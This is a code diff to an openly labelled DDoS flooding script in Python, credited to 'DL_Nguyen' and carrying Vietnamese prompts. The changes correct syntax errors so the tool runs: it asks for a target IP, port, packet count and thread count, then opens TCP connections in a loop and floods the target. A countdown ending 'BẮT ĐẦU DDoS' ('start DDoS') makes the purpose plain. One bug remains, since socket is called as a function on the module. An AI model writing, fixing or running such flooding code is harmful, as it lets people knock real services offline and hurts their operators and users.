@@ -3,7 +3,7 @@ import threading
 import socket
 import os
 import time
-from termcolor improt colored
+from termcolor import colored
 os.system('clear')
 os.system('cls')
 print(colored(r"""
@@ -17,12 +17,12 @@ _________          _______           _______  _        _______  _        _______
    | |   | )   ( || )   ( |   | |   | (___) || )  \  || (___) || )  \  || (___) |___) (___
    )_(   |/     \||/     \|   \_/   (_______)|/    )_)(_______)|/    )_)(_______)\_______/
                                                                                           
-|   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   | created by DL_Nguyen""",'green'))
+|   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   |   | created by DL_Nguyen""",'blue'))
 
-ip = str(input(colored("[+] Vui Lòng Nhập IP TARGET: ",'green')))
-port = int(input(colored("[+] Vui Lòng Nhập Port: ",'green')))
-packet = int(input(coloed("[+] Vui Lòng Nhập Số Lượng: ','green')))
-thread = int(input(coloed("[+] Threads: ','green')))
+ip = str(input(colored("[+] : ",'green')))
+port = int(input(colored("[+] Port: ",'green')))
+packet = int(input(colored("[+] Packets: ",'green')))
+thread = int(input(colored("[+] Threads: ",'green')))
 time.sleep(2)
 
 os.system('cls')
@@ -39,12 +39,12 @@ print(colored("#################################################################
 time.sleep(2)
 print(colored("\n[+] Start.......",'green'))
 time.sleep(1)
-print(colored("\n3",'green'))
-time.sleep(1)
-print(colored("\n2",'green))
-time.sleep(1)
-print(colored("\n1",'green'))
-time.sleep(1)
+print(colored("\n3 : CẢM ƠN BẠN ĐÃ SỬ DỤNG TOOLS",'blue'))
+time.sleep(3)
+print(colored("\n2 : VUI  LÒNG CHỜ TRONG GIÂY LÁT",'red'))
+time.sleep(3)
+print(colored("\n1 : BẮT ĐẦU DDoS",'green'))
+time.sleep(3)
 os.system('cls')
 os.system('clear')
 
@@ -54,7 +54,7 @@ def syn():
      while True :
           try: 
                  h = socket(socket.AF_INET, socket.SOCK_STREAM)
-                 h.connect(ip,port))
+                 h.connect((ip,port))
                  h.send(hevin)
                  for i in range(packet):
                      h.send(hevin)
